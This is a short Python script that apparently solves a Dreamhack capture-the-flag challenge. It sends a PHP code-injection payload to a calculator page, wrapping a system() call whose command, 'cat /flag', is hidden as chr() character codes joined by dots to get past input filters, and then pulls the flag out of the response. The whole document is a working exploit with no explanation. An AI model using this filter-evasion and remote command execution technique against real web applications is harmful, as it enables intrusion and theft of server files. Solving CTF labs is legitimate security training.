import requests
import re

url = "http://host8.dreamhack.games:21332"

def obf(s):
    return '.'.join(f'chr({ord(c)})' for c in s)

cmd = 'cat /flag'
payload = '{system(%s)}' % obf(cmd)

res = requests.get(f"{url}/cal.php?f={payload}")

flag = re.findall(r'Result:(.+)</p>', res.text)[0].strip()
print("Flag:", flag)